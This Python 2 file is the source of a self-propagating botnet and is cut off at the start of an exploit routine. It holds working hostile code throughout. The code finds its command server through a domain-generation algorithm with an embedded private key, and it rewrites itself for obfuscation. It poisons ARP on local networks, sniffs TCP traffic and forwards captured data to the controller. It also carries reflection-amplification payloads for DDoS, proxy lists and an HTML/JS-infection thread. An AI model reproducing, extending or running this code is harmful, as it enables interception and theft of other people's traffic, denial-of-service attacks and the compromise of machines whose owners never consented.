#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import re,socket,subprocess,os,sys,urllib,urllib2,time,threading,random,itertools,platform,multiprocessing,select,ssl,struct,ast,zlib,array
if os.name == 'nt':
    import webbrowser, shutil, psutil
    from ctypes import *
    from _winreg import *
    from win32event import CreateMutex
    from win32api import GetLastError,GetCommandLine
    from winerror import ERROR_ALREADY_EXISTS
else:
    import fcntl
from hashlib import sha512
from binascii import unhexlify
from base64 import b64decode,b64encode
from uuid import getnode
global variablestoreplace,functionstoreplace,stringstoreplace,alteredcode,minvarlen,minstrlen,cwasses,loggedin,portlist,validserver,mylanip,mycncip,mydomain,proxylist
def obfuscate(s):
    nmask = [212, 55, 14, 121, 109, 247, 119, 92, 152, 42, 175, 149, 49, 242, 43, 70, 250, 248, 68]
    return ''.join([chr(ord(c) ^ nmask[i % len(nmask)]) for i, c in enumerate(s)])
proxylist = ["77.238.128.166:9050", "192.248.190.123:8017", "192.248.190.123:8009", "213.251.238.186:9050", "178.62.242.15:9107", "88.198.82.11:9051", "52.3.115.71:9050", "83.217.28.46:9050", "147.135.208.44:9095", "188.166.34.137:9000", "103.233.206.22:179", "161.97.71.22:9000", "54.161.239.214:9050", "194.5.178.150:666", "144.91.74.241:9080", "134.209.230.13:8080", "201.40.122.152:9050", "206.81.27.29:8080", "127.0.0.1:9050"]
minvarlen=5
minstrlen=6
stringstoreplace = []
mydomain = ""
mycncip = ""
loggedin = -1
portlist = [80, 443, 7001, 8080, 8081, 8000, 8443, 8181] 
blacklist = [465, 587, 23, 443, 37215, 53, 22, 443, 37215]
PAYLOAD = {
    '\x73\x6e\x6d\x70':('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00'),
    '\x6e\x74\x70':('\x17\x00\x02\x2a'+'\x00'*4),
    '\x63\x6c\x64\x61\x70':('\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00\x00'),
    '\x73\x73\x64\x70':(zlib.decompress('\x78\x9c\xf3\xd5\x0d\x76\x75\x0c\x72\xf6\x50\xd0\x52\xf0\x08\x09\x09\xd0\x37\xd4\x33\xe4\xe5\xf2\xc8\x2f\x2e\xb1\x32\x32\xb6\xd4\x33\x32\x35\x85\x62\x03\x2b\x43\x4b\x03\x03\x5e\xae\xe0\x10\xab\xe2\xe2\x94\x02\xab\xc4\x9c\x1c\x5e\x2e\xdf\xc4\x3c\x2b\x25\x30\x37\x25\xb3\x38\x39\xbf\x2c\xb5\x48\x09\x28\x18\x61\x65\xcc\xcb\xc5\xcb\x05\x00\xff\x1b\x17\x04'))
}
global mylanip
try:
    getips = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    getips.connect(("1.1.1.1", 53))
    mylanip=getips.getsockname()[0]
    getips.close()
except:
    mylanip=""
def getPoisonIPs():
    poison=[]
    fh=open("/proc/net/arp", "rb")
    table_=fh.readlines()
    fh.close()
    table_.pop(0)
    for x in table_:
        x=x.split()
        if x[2]=="0x2":
            if x[0] != mylanip:
                poison.append((x[0], x[3]))
    return poison
def get_src_mac():
    mac_dec = hex(getnode())[2:-1]
    while (len(mac_dec) != 12):
        mac_dec = "0" + mac_dec
    return unhexlify(mac_dec)
global mymac
mymac=get_src_mac().encode('hex')
def get_default_gateway_linux():
    with open("/proc/net/route") as fh:
        for line in fh:
            fielssds = line.strip().split()
            if fielssds[1] != '00000000' or not int(fielssds[3], 16) & 2:
                continue
            return socket.inet_ntoa(struct.pack("<L", int(fielssds[2], 16)))
def all_interfaces():
    if os.name == 'nt':
        return ""
    max_possible = 128 * 32
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    names = array.array('B', '\0' * max_possible)
    outbytes = struct.unpack('iL', fcntl.ioctl(
        s.fileno(),
        0x8912,
        struct.pack('iL', max_possible, names.buffer_info()[0])
    ))[0]
    namestr = names.tostring()
    lst = []
    for i in range(0, outbytes, 40):
        lst.append(namestr[i:i+16].split('\0', 1)[0])
    return lst
def poison(iface):
    global mymac
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
    s.bind((iface, 0))
    while(1):
        for lmfao in getPoisonIPs():
            src_addr = mymac
            dst_addr = lmfao[0]
            src_ip_addr = get_default_gateway_linux()
            dst_ip_addr = lmfao[1]
            dst_mac_addr = "\x00\x00\x00\x00\x00\x00"
            payload = "\x00\x01\x08\x00\x06\x04\x00\x02"
            mychecksum = "\x00\x00\x00\x00"
            ethertype = "\x08\x06"
            s.send(dst_addr + src_addr + ethertype + payload+src_addr + src_ip_addr
                   + dst_mac_addr + dst_ip_addr + mychecksum)
        time.sleep(2)
def daemonize():
    if os.name == 'nt':
        return 1
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        return 0
    os.setsid()
    os.umask(0)
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        return 0
    return 1
def checksum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data)-n, 2):
        s+= ord(data[i]) + (ord(data[i+1]) << 8)
    if n:
        s+= ord(data[i+1])
    while (s >> 16):
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xffff
    return s
global myfullpath
myfullpath=os.path.realpath(__file__)
inputfile=open(myfullpath,"rb")
startingcode=inputfile.read()
inputfile.close()
class AnalyzeStrings(ast.NodeVisitor):
    def visit_Str(self, node): 
        try:
            readingLine=startingcode.split("\n")[node.lineno-1]
            stringChar=readingLine[node.col_offset:node.col_offset+len(node.s)+2][0]
            stringFound=eval(repr(stringChar + "".join(readingLine[node.col_offset+1:node.col_offset+len(node.s)+len(readingLine[node.col_offset-1:node.col_offset+len(node.s)+1].split(readingLine[node.col_offset+1:node.col_offset+len(node.s)+2][0])[0])+4][:readingLine[node.col_offset+1:node.col_offset+len(node.s)+len(readingLine[node.col_offset-1:node.col_offset+len(node.s)+2].split(readingLine[node.col_offset+1:node.col_offset+len(node.s)+2][0])[0])+4].find(stringChar)]) + stringChar))
            if len(stringFound)>=minstrlen and "\\x" not in stringFound and stringFound not in stringstoreplace and "zlib" not in readingLine:
                stringstoreplace.append(stringFound)
        except:
            pass
def csum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data)-n, 2):
        s+= ord(data[i]) + (ord(data[i+1]) << 8)
    if n:
        s+= ord(data[i+1])
    while (s >> 16):
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xffff
    return s
class IPHEADER(object):
    def __init__(self, source, destination, payload='', ipproto=socket.IPPROTO_UDP):
        self.ipversion = 4
        self.ihl = 5
        self.tos = 0
        self.tl = 20+len(payload)
        self.id = 0
        self.asdflags = 0
        self.offset = 0
        self.ttl = 255
        self.protocol = ipproto
        self.checksum = 2
        self.source = socket.inet_aton(source)
        self.destination = socket.inet_aton(destination)
    def mkpkt(self):
        ver_ihl = (self.ipversion << 4) + self.ihl
        flags_offset = (self.asdflags << 13) + self.offset
        ip_header = struct.pack("!BBHHHBBH4s4s",
                    ver_ihl,
                    self.tos,
                    self.tl,
                    self.id,
                    flags_offset,
                    self.ttl,
                    self.protocol,
                    self.checksum,
                    self.source,
                    self.destination)
        self.checksum = csum(ip_header)
        ip_header = struct.pack("!BBHHHBBH4s4s",
                    ver_ihl,
                    self.tos,
                    self.tl,
                    self.id,
                    flags_offset,
                    self.ttl,
                    self.protocol,
                    socket.htons(self.checksum),
                    self.source,
                    self.destination)  
        return ip_header
class UDPHEADER(object):
    def __init__(self, src, dst, payload=''):
        self.src = src
        self.dst = dst
        self.payload = payload
        self.checksum = 0
        self.length = 8
    def mkpkt(self, src, dst, ipproto=socket.IPPROTO_UDP):
        length = self.length + len(self.payload)
        pseudo_header = struct.pack('!4s4sBBH',
            socket.inet_aton(src), socket.inet_aton(dst), 0, 
            ipproto, length)
        self.checksum = csum(pseudo_header)
        packet = struct.pack('!HHHH',
            self.src, self.dst, length, 0)
        return packet
def randomstring(strlength):
    return ''.join(random.choice("abcdefghijklmnopqoasadihcouvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(strlength))
class mainprocess():
    def is_socket_valid(self, socket_instance):
        if not socket_instance:
            return False
        try:
            socket_instance.getsockname()
        except socket.error as err:
            return False
        try:
            socket_instance.getpeername()
        except socket.error as err:
            return False
        return True
    def stringproc(self,s):
        ch = (ord(c) for c in s)
        return ''.join(('\\x%02x' % c) if c <= 255 else ('\\u%04x' % c) for c in ch)
    def repackbot(self):
        variablestoreplace = []
        functionstoreplace = []
        cwasses = []
        inputfile=open(myfullpath,"rb")
        startingcode=alteredcode=inputfile.read()
        inputfile.close()
        p = ast.parse(startingcode)
        AnalyzeStrings().visit(p)
        for tricky in sorted(stringstoreplace, key=len, reverse=True):
            if len(tricky)>=minstrlen:
                try:
                    if (tricky[0] == "'" and tricky[-1] == "'") or (tricky[0] == '"' and tricky[-1] == '"'):
                        alteredcode=alteredcode.replace(tricky, "obfuscate(zlib.decompress(\x22"+self.stringproc(zlib.compress(obfuscate(tricky[1:-1].decode('string_escape'))))+"\x22))")
                    else:
                        alteredcode=alteredcode.replace(tricky, "obfuscate(zlib.decompress(\x22"+self.stringproc(zlib.compress(obfuscate(eval(tricky).decode('string_escape'))))+"\x22))")
                except:
                    pass
        cwasses = [node.name for node in ast.walk(p) if isinstance(node, ast.ClassDef)]
        variablestoreplace = sorted({node.id for node in ast.walk(p) if isinstance(node, ast.Name) and not isinstance(node.ctx, ast.Load)})
        for fwunction in [n for n in p.body if isinstance(n, ast.FunctionDef)]:
            functionstoreplace.append(fwunction.name)
        cwasses = [node for node in ast.walk(p) if isinstance(node, ast.ClassDef)]
        for cwass in cwasses:
            for fwunction in [n for n in cwass.body if isinstance(n, ast.FunctionDef)]:
                if fwunction.name != "__init__" and fwunction not in functionstoreplace:
                    functionstoreplace.append(fwunction.name)
        randarry=[]
        alls=[]
        for i in range(len(functionstoreplace)+len(variablestoreplace)+len(cwasses)):
            randstring = randomstring(random.randint(8,12))
            while randstring in randarry:
                randstring = randomstring(random.randint(8,12))
            randarry.append(randstring)
        totalcount=0
        for vawiable in sorted(variablestoreplace, key=len, reverse=True):
            if len(vawiable) >= minvarlen and vawiable != "self" and not vawiable.startswith("__"):
                alteredcode=alteredcode.replace(vawiable, randarry[totalcount])
            totalcount+=1
        for fwunction in sorted(functionstoreplace, key=len, reverse=True):
            alteredcode=alteredcode.replace(fwunction, randarry[totalcount])
            totalcount+=1
        for cwass in cwasses:
            alls.append(randarry[totalcount])
            alteredcode=alteredcode.replace(cwass.name, randarry[totalcount])
            totalcount+=1
        outputfile=open(myfullpath,"wb")
        outputfile.write(alteredcode)
        outputfile.close()
    def AODnevgEK(self, strg):
        return zlib.decompress(strg)
    def bigSNIFFS(self):
        if os.name == 'nt':
            return
        global mycncip
        up = 0
        for iface in all_interfaces():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                result = fcntl.ioctl(s.fileno(), 0x8913, iface + '\0'*256)
                asdflags, = struct.unpack('H', result[16:18])
                up = asdflags & 1
            except:
                pass
            if up == 1:
                threading.Thread(target=poison, args=(iface,)).start()
                break
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except:
            return
        pktcount = 0
        ss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        while True:
            try:
                while self.snifferenabled == 0:
                    time.sleep(1)
                if not self.is_socket_valid(ss):
                    try:
                        ss=socks.socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        ss.connect((mycncip, 1337))
                    except:
                        time.sleep(10)
                packet = s.recvfrom(65565)
                pktcount=pktcount+1
                packet=packet[0]
                eth_length = 14
                eth_header = packet[:eth_length]
                eth_unpack  =  struct.unpack('!6s6sH',eth_header)
                eth_protocol = socket.ntohs(eth_unpack[2])
                ip_header = packet[0:20]
                header_unpacked = struct.unpack('!BBHHHBBH4s4s',ip_header)
                version_ih1= header_unpacked[0] 
                ipversion = version_ih1 >> 4 
                ih1 = version_ih1 & 0xF
                iph_length = ih1*4
                ttl = header_unpacked[5]
                protocol = header_unpacked[6]
                source_add = socket.inet_ntoa(header_unpacked[8])
                destination_add = socket.inet_ntoa(header_unpacked[9])
                tcp_header = packet[iph_length:iph_length+20]
                tcph = struct.unpack('!HHLLBBHHH',tcp_header)
                source_port = tcph[0]
                dest_port = tcph[1]
                sequence = tcph[2]
                ASDngewodD = tcph[3]
                resrve = tcph[4]
                tcph_len = resrve >> 4
                h_size = iph_length+tcph_len*4
                data_size = len(packet)-h_size
                data = packet[h_size:]
                if len(data) > 2 and src_port not in blacklist and dest_port not in blacklist and destination_add not in self.scanips and source_add not in self.scanips:
                    try:
                        ss.send("IPv"+str(ipversion)+ "\nttl:"+str(ttl)+"\nproto:"+str(protocol)+"\nsrcip:"+str(source_add)+"\ndstip:"+str(destination_add)+"\n\nsrcprt:"+str(source_port)+"\ndstprt:"+str(dest_port)+"\nBEGIN\n"+data+"\nEND\n")
                    except:
                        pass
            except:
                pass
    def __init__(self):
        global mycncip,mydomain
        dnd_d20count=0
        validserver=0
        mycertfile=(os.getenv("TEMP") if os.name=="nt" else "/tmp") + os.path.sep + ".cert.pem"
        while 1:
            if dnd_d20count>=0xCC:
                dnd_d20count=0
            dnd_d20count+=1
            try:
                random.seed(a=0x7774DEAD + dnd_d20count)
                mydomain=(''.join(random.choice("abcdefghijklmnopqoasadihcouvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(random.randrange(10,19)))).lower()
                mydomain+="."+random.choice(["ddns.net","ddnsking.com","3utilities.com","bounceme.net","freedynamicdns.net","freedynamicdns.org","gotdns.ch","hopto.org","myddns.me","myftp.biz","myftp.org","myvnc.com","onthewifi.com","redirectme.net","servebeer.com","serveblog.net","servecounterstrike.com","serveftp.com","servegame.com","servehalflife.com","servehttp.com","serveirc.com","serveminecraft.net","servemp3.com","servepics.com","servequake.com","sytes.net","viewdns.net","webhop.me","zapto.org"])
                mycertf='-----BEGIN CERTIFICATE-----\nMIIEFTCCAv2gAwIBAgIUDdnXJdSqDkP65k9oiH06aqbFRBcwDQYJKoZIhvcNAQEL\nBQAwgZkxCzAJBgNVBAYTAjAwMQowCAYDVQQIDAEtMREwDwYDVQQHDAh5b3VyIGJv\neDEVMBMGA1UECgwMS2VrIFNlY3VyaXR5MRMwEQYDVQQLDApPcGVyYXRpb25zMRow\nGAYDVQQDDBFuZXRsb2FkZXIua2VrLm9yZzEjMCEGCSqGSIb3DQEJARYUZnJlYWth\nbm9uQHJpc2V1cC5uZXQwHhcNMjEwMTE2MjIxMDE4WhcNMjIwMTE2MjIxMDE4WjCB\nmTELMAkGA1UEBhMCMDAxCjAIBgNVBAgMAS0xETAPBgNVBAcMCHlvdXIgYm94MRUw\nEwYDVQQKDAxLZWsgU2VjdXJpdHkxEzARBgNVBAsMCk9wZXJhdGlvbnMxGjAYBgNV\nBAMMEW5ldGxvYWRlci5rZWsub3JnMSMwIQYJKoZIhvcNAQkBFhRmcmVha2Fub25A\ncmlzZXVwLm5ldDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKklfNrL\n+TgMgpCCmQr5KvJLPDiVKU58H/5dfrZFG4nsK7J10x7swE+uCCS3+P4Hho5EbxDC\ntEtDtJHDk8dzNqMEEu3uFEe5uWltER6i1VTiGULPvTA90Zrp3zNvCyIP1ErmSbop\nHmp/SiCBYPbtnpwrASlRpFwJrdZwVwRsYpd/yoCwXc7l79FMa3znnTSZC9AOJV7h\n++aggm5LoT1UDozzxZrk4A07H05WKOwK7nXj7bpCqSMlXgcmtqIC6gGDLz0iG+xs\naIqy9jkOv5FWo+8svGGSBsxEps4PfW4TL1F4nLjz+zkYbLrvzHllXkqUCz819k/c\npyFJ+tzLYYuqNacCAwEAAaNTMFEwHQYDVR0OBBYEFBsLXlnYkD7Xokkg6mCLNnEu\ndE03MB8GA1UdIwQYMBaAFBsLXlnYkD7Xokkg6mCLNnEudE03MA8GA1UdEwEB/wQF\nMAMBAf8wDQYJKoZIhvcNAQELBQADggEBACSbAoyg4zFKSm/0flj99qotP97uQIZ/\nW8NNEq6QHnoGQeG29NPTRKHDt99J6z7Yt4I9Q7dMCxJtUaYsRBMAmqaGpiZKcFr2\nym2fkd9iaf4/XkSWocLm2GlZ9vUvZNJH27rW4PvuCxcrKetmMA/8JlRkhIk8YaMu\nyWbSdAP9nBNdFxYvsFabF7EaKemEASJIIuwD93oKeYUt5fMMnKAd5ZRiFfqOdknO\nTp7m//u20I9nX6rV7N4Y0/lTr5DqL3OE4kxLxZVfEcn9JMOcsIew51Jt2mu/DuKp\n71TzMOUSfGnPbLnut1WRXGWbABeJXctqGkhRKD9wRvUsJzmw1ZHmffU=\n-----END CERTIFICATE-----\n'
                fh=open(mycertfile, "w")
                fh.write('-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCpJXzay/k4DIKQ\ngpkK+SrySzw4lSlOfB/+XX62RRuJ7CuyddMe7MBPrggkt/j+B4aORG8QwrRLQ7SR\nw5PHczajBBLt7hRHublpbREeotVU4hlCz70wPdGa6d8zbwsiD9RK5km6KR5qf0og\ngWD27Z6cKwEpUaRcCa3WcFcEbGKXf8qAsF3O5e/RTGt85500mQvQDiVe4fvmoIJu\nS6E9VA6M88Wa5OANOx9OVijsCu514+26QqkjJV4HJraiAuoBgy89IhvsbGiKsvY5\nDr+RVqPvLLxhkgbMRKbOD31uEy9ReJy48/s5GGy678x5ZV5KlAs/NfZP3KchSfrc\ny2GLqjWnAgMBAAECggEARaN/gf1Uf/T2lFSQeeoX+mVrR8hxlzSXX3xSvOw66E/p\ntbG42BSVILj/9U4hH0Ut6sjWCUqAPDSF1TV2VDllFzyIJplMlDMs2PDkiX504lus\nFsu8km4BLAx5ro1bQgzOVH/3fsOLGEGL3VIm/8LY+GbkNYS9bH83qP/bc6DD/qcc\n4cCKOkPxLORbZFP2hj45dkuP1FVHpELVQAKyRkm8Gcbi94viV6OFKojQw4yP5E4m\n6RPKPpgzYvYV6lcLmu9ic4iNkWhji6q9fIw/9WoFAndItTFtRc0ponYsrQTMNS33\nNhYba4eA2yB/+m1B5W8by2W4yjdnSo0Ckp31hfN9UQKBgQDXEVkzUFFJonitkmEt\nL0DeKDDYn7GnqMZcffTBw2Gn97MQoM7wceyQkL9BdNMfWTq7wWcqosuihPVgCgVt\nGQ3coVLzWdq4t/u759AzJU5lhmtzlL5ssF3GyZMCaRi+JQ0aoZK5ipsuDplz3SPj\nIOkNJR7nOHpCieKC7smU9wIVvQKBgQDJVrwPPOKuo1xdE7ox6We9u40qIuUl3pvp\nrul09Pc3glf7o1I0HPfx+4aq7hZvrOTmYWzkSGzXUNeYIaYugED5jCA2PD/a2/ke\ngYB3Cif8aEv8Jy/p9zfGAWn8zSNXhMmpVRhWhTCF02UssSe6ZuSIseslyWlmTLaa\n58JOL1r1MwKBgQDFKBs8xkFunmnAvLMnB+2QewmkXGkxSLBnc/RfeKxaneFiufhb\nRiTWtksOR3mPgG4uVvMri8ff+cEzxJwK0m/5tU5k1heDRO6Z6L3dVTLUMXDpqQ8U\ndm3RYVLKX+wVy8OCiWIHg4AUrb+RDsXqXm4m5cO5tfWmb97dpufXDsWzhQKBgBPv\nY5V6qNMz15xbrK7udlgh7ttCM0App3Re3jy3WJcFb+K5jBUe3Sn3hqD8C/qous1Y\nzihYR3aWSZKFmme2STisODBGjOgFqcfseKTQu57RUNy5oJPg54PSdgUS5rHusuzy\nQQOoEmLdyIHBVLavI2epfifypl37sITr96A4LiBjAoGAHugwLLKfO9skxahM7iPF\n7KOxTPFo0MbtuCb9zkduNyJv+pg1x0A5WSIynzWGsiphgvUtb+Uo9oMQBNfCVT0/\nOoIaJ5/4scmt9XaKmoRqV/Wsa1vJdL83bNpsKo2R3V+ySi8WVvUQGk2zZ8JUYi3y\nMCjURwxxQQwSpTZ4C2ANur4=\n-----END PRIVATE KEY-----\n'+mycertf)
                fh.close()
                if validserver==0:
                    try:
                        mycncip=socket.gethostbyname(mydomain)
                        securesock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        securesock.connect((mycncip, 465))
                        securesock=ssl.wrap_socket(securesock, cert_reqs=ssl.CERT_NONE, ca_certs=None, server_side=False, certfile=mycertfile, keyfile=mycertfile, ssl_version=ssl.PROTOCOL_TLS)
                        validate=sha512(zlib.compress(securesock.recv(64))).digest()
                        securesock.send(validate)
                        verifikey=securesock.recv(64)
                        if validate[:-5]==verifikey[:-5]:
                            securesock.send("\x01")
                            self.injectdomainlength=ord(verifikey[-1])
                            prefexlen=ord(verifikey[-2])
                            botpasswordlen=ord(verifikey[-3])
                            keylength=ord(verifikey[-4])
                            chanlength=ord(verifikey[-5])
                            self.channelname=zlib.decompress(securesock.recv(chanlength))
                            self.channelkey=zlib.decompress(securesock.recv(keylength))
                            self.botpasswd=zlib.decompress(securesock.recv(botpasswordlen))
                            self.cmdprefix=zlib.decompress(securesock.recv(prefexlen))
                            self.injectdomain=zlib.decompress(securesock.recv(self.injectdomainlength))
                            validserver=1
                            try:
                                securesock.close()
                            except:
                                pass
                            break
                    except:
                        continue
                    break
            except:
                continue
        sys.stdout = sys.stderr = open(os.devnull,'wb')
        random.seed(a=time.time()*os.getpid())
        self.repackbot()
        self.ctx = ssl.create_default_context()
        self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_NONE
        self.VwkBkdwM=randomstring(random.randrange(8,16))
        self.gLsaWmlh=0
        self.XUbvPqib=0
        self.VSoeKsdv=0
        self.AELmEnMe=0
        self.cmdprefix="."
        self.exploitstats={"gaybots":[0,0]}
        self.scannerenabled = 1
        self.snifferenabled = 0
        self.scanips=[]
        threading.Thread(target=self.infecthtmljs).start()
        threading.Thread(target=self.bigSNIFFS).start()
        self.hLqhZnCt="[HAX|"+platform.system()+"|"+platform.machine()+"|"+str(multiprocessing.cpu_count())+"]"+str(self.VwkBkdwM)
        self.aRHRPteL="[HAX|"+platform.system()+"|"+platform.machine()+"|"+str(multiprocessing.cpu_count())+"]"+str(self.VwkBkdwM)
        self.pBYbuWVq=str(self.VwkBkdwM)
        self.GbASkEbE=["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
        "Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
        "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
        "Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
        "Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
        "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
        "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
        "Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
        "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
        "Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1"]
        threading.Thread(target=self.dajsJgBT, args=()).start()
        for _ in range(0xFF):
            try:
                threading.Thread(target=self.worker).start()
            except:
                pass
        self.IRCConnect()
    def recvTimeout(self, sack, rsize, thetime=8):
        sack.setblocking(0)
        ready = select.select([sack], [], [], thetime)
        if ready[0]:
            data = sack.recv(rsize)
            return data
        return ""
    def gen_discover_packet(self, ad_id, os, hn, user, inf, func):
            d  = chr(0x3e)+chr(0xd1)+chr(0x1)
            d += struct.pack('>I', ad_id)
            d += struct.pack('>I', 0)
            d += chr(0x2)+chr(os)
            d += struct.pack('>I', len(hn)) + hn
            d += struct.pack('>I', len(user)) + user
            d += struct.pack('>I', 0)
            d += struct.pack('>I', len(inf)) + inf
            d += chr(0)
            d += struct.pack('>I', len(func)) + func
            d += chr(0x2)+chr(0xc3)+chr(0x51)
            return d
    def exploit(self, ip, srvport):
        global mydomain
